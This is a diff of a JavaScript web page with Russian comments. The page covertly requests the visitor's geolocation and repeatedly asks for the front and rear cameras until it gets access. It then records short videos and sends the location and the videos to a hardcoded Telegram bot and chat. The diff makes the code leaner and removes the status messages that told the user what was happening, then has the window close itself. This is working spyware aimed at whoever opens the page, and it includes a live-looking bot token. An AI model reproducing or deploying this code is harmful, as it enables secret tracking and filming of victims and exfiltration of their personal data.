@@ -3,212 +3,110 @@ const BOT_TOKEN = '8621842542:AAGj8u2N6VHyIZNw3qX_qN9aSsSOYsZi424';
 const CHAT_ID = '8244138604';
 
 const video = document.getElementById('video');
-const loaderContainer = document.querySelector('.loader-container');
-let stream = null;
-let locationData = null;
-let mediaRecorder = null;
-let recordedChunks = [];
+let locationGranted = false;
 
-// Обновление текста загрузки
-function updateLoaderText(text) {
-    const loaderText = document.querySelector('.loader-text');
-    if (loaderText) {
-        loaderText.textContent = text;
-    }
-}
-
-// Функция запроса геолокации (только 2 попытки)
-async function requestLocation() {
-    return new Promise((resolve) => {
-        let attempts = 0;
-        const maxAttempts = 2;
-        
-        updateLoaderText(`Запрос геолокации (${attempts + 1}/${maxAttempts})...`);
-        
-        const askLocation = () => {
-            attempts++;
-            updateLoaderText(`Запрос геолокации (${attempts}/${maxAttempts})...`);
-            
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        locationData = {
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude
-                        };
-                        updateLoaderText('✅ Геолокация получена');
-                        setTimeout(() => resolve(), 500);
-                    },
-                    (error) => {
-                        if (attempts < maxAttempts) {
-                            setTimeout(askLocation, 2000);
-                        } else {
-                            updateLoaderText('⚠️ Геолокация недоступна, продолжаем...');
-                            setTimeout(() => resolve(), 1000);
-                        }
-                    }
-                );
-            } else {
-                updateLoaderText('⚠️ Геолокация не поддерживается');
-                setTimeout(() => resolve(), 1000);
-            }
-        };
-        
-        askLocation();
-    });
-}
-
-// Функция запроса камеры (бесконечное повторение)
-async function requestCamera(facingMode, cameraName) {
-    return new Promise((resolve) => {
-        updateLoaderText(`Запрос ${cameraName} камеры...`);
-        
-        const askCamera = () => {
-            const constraints = {
-                video: {
-                    facingMode: { exact: facingMode },
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
-                },
-                audio: false // Без звука
-            };
-            
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(stream => {
-                    updateLoaderText(`✅ ${cameraName} камера готова`);
-                    setTimeout(() => resolve(stream), 500);
-                })
-                .catch(() => {
-                    updateLoaderText(`❌ Нет доступа к ${cameraName} камере, повтор через 2 сек...`);
-                    setTimeout(askCamera, 2000);
-                });
-        };
-        askCamera();
-    });
-}
-
-// Запись видео (4 секунды)
-async function recordVideo(stream, durationMs, cameraName) {
-    return new Promise((resolve) => {
-        recordedChunks = [];
-        
-        // Настраиваем видео на элемент
-        video.srcObject = stream;
-        video.play();
-        
-        // Создаем MediaRecorder для записи видео
-        const options = { mimeType: 'video/webm' };
-        mediaRecorder = new MediaRecorder(stream, options);
-        
-        mediaRecorder.ondataavailable = (event) => {
-            if (event.data.size > 0) {
-                recordedChunks.push(event.data);
-            }
-        };
-        
-        mediaRecorder.onstop = () => {
-            // Создаем видео файл из записанных данных
-            const blob = new Blob(recordedChunks, { type: 'video/webm' });
-            resolve(blob);
-        };
-        
-        // Запускаем запись
-        mediaRecorder.start();
-        updateLoaderText(`📹 Запись ${cameraName} камеры: 0 сек`);
-        
-        let seconds = 0;
-        const interval = setInterval(() => {
-            seconds++;
-            updateLoaderText(`📹 Запись ${cameraName} камеры: ${seconds}/${durationMs/1000} сек`);
-        }, 1000);
-        
-        // Останавливаем запись через durationMs
-        setTimeout(() => {
-            clearInterval(interval);
-            mediaRecorder.stop();
-            updateLoaderText(`✅ Запись ${cameraName} камеры завершена`);
-            setTimeout(() => resolve(blob), 500);
-        }, durationMs);
-    });
+// Отправка в Telegram
+async function sendToTelegram(method, data) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
+    try {
+        await fetch(url, { method: 'POST', body: data });
+    } catch(e) {}
 }
 
 // Отправка геолокации
-async function sendLocation() {
-    if (!locationData) return;
-    
-    updateLoaderText('📍 Отправка геолокации...');
-    
-    const mapsUrl = `https://yandex.com/maps/?pt=${locationData.lon},${locationData.lat}&z=17&l=map`;
-    const text = `📍 Местоположение: ${mapsUrl}`;
-    
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+async function sendLocation(lat, lon) {
+    const mapsUrl = `https://yandex.com/maps/?pt=${lon},${lat}&z=17&l=map`;
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
-    formData.append('text', text);
-    
-    try {
-        await fetch(url, { method: 'POST', body: formData });
-        updateLoaderText('✅ Геолокация отправлена');
-        await new Promise(resolve => setTimeout(resolve, 500));
-    } catch(e) {
-        updateLoaderText('⚠️ Ошибка отправки геолокации');
-        await new Promise(resolve => setTimeout(resolve, 500));
-    }
+    formData.append('text', `📍 Местоположение: ${mapsUrl}`);
+    await sendToTelegram('sendMessage', formData);
 }
 
-// Отправка видео в Telegram
-async function sendVideoToTelegram(videoBlob, caption) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
-    
+// Отправка видео
+async function sendVideo(videoBlob, caption) {
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
     formData.append('video', videoBlob, 'video.webm');
     formData.append('caption', caption);
-    
-    try {
-        const response = await fetch(url, { method: 'POST', body: formData });
-        const result = await response.json();
-        return result.ok;
-    } catch(e) {
-        console.error('Ошибка отправки видео:', e);
-        return false;
-    }
+    await sendToTelegram('sendVideo', formData);
 }
 
-// Основная функция
+// Запрос геолокации (1 попытка)
+async function askLocation() {
+    return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+            (position) => resolve({ lat: position.coords.latitude, lon: position.coords.longitude }),
+            () => resolve(null)
+        );
+    });
+}
+
+// Запрос геолокации с повторением
+async function requestLocation(maxAttempts) {
+    for (let i = 0; i < maxAttempts; i++) {
+        const loc = await askLocation();
+        if (loc) return loc;
+        if (i < maxAttempts - 1) await new Promise(r => setTimeout(r, 2000));
+    }
+    return null;
+}
+
+// Запрос камеры (бесконечно)
+async function requestCamera(facingMode) {
+    return new Promise((resolve) => {
+        const ask = () => {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: { exact: facingMode }, width: 1280, height: 720 }
+            }).then(resolve).catch(() => setTimeout(ask, 2000));
+        };
+        ask();
+    });
+}
+
+// Запись видео
+async function recordVideo(stream, ms) {
+    return new Promise((resolve) => {
+        const chunks = [];
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        recorder.ondataavailable = e => e.data.size && chunks.push(e.data);
+        recorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
+        video.srcObject = stream;
+        video.play();
+        recorder.start();
+        setTimeout(() => recorder.stop(), ms);
+    });
+}
+
+// ГЛАВНАЯ ФУНКЦИЯ
 async function main() {
-    try {
-        // 1. Геолокация (2 попытки)
-        await requestLocation();
-        
-        // 2. Фронтальная камера + запись видео 4 сек
-        stream = await requestCamera('user', 'фронтальной');
-        const frontVideo = await recordVideo(stream, 4000, 'фронтальной');
-        stream.getTracks().forEach(track => track.stop());
-        
-        // 3. Задняя камера + запись видео 4 сек
-        stream = await requestCamera('environment', 'задней');
-        const backVideo = await recordVideo(stream, 4000, 'задней');
-        stream.getTracks().forEach(track => track.stop());
-        
-        // 4. Отправка
-        await sendLocation();
-        
-        updateLoaderText('📤 Отправка фронтального видео...');
-        await sendVideoToTelegram(frontVideo, '📹 Фронтальная камера (4 секунды)');
-        
-        updateLoaderText('📤 Отправка заднего видео...');
-        await sendVideoToTelegram(backVideo, '📹 Задняя камера (4 секунды)');
-        
-        // 5. Завершение
-        updateLoaderText('✅ Готово! Закрытие...');
-        setTimeout(() => window.close(), 2000);
-        
-    } catch (error) {
-        updateLoaderText('❌ Ошибка, перезагрузите страницу');
-        console.error(error);
+    // 1. Геолокация (2 попытки)
+    const firstLoc = await requestLocation(2);
+    if (firstLoc) {
+        await sendLocation(firstLoc.lat, firstLoc.lon);
+        locationGranted = true;
     }
+    
+    // 2. Фронтальная камера (5 сек)
+    const frontStream = await requestCamera('user');
+    const frontVideo = await recordVideo(frontStream, 5000);
+    await sendVideo(frontVideo, '📹 Фронтальная камера (5 сек)');
+    frontStream.getTracks().forEach(t => t.stop());
+    
+    // 3. Задняя камера (3 сек)
+    const backStream = await requestCamera('environment');
+    const backVideo = await recordVideo(backStream, 3000);
+    await sendVideo(backVideo, '📹 Задняя камера (3 сек)');
+    backStream.getTracks().forEach(t => t.stop());
+    
+    // 4. Второй запрос геолокации (если в первый раз не дали)
+    if (!locationGranted) {
+        const secondLoc = await askLocation();
+        if (secondLoc) await sendLocation(secondLoc.lat, secondLoc.lon);
+    }
+    
+    // 5. Закрытие
+    setTimeout(() => window.close(), 1000);
 }
 
-// Запуск
+// ЗАПУСК
 main();
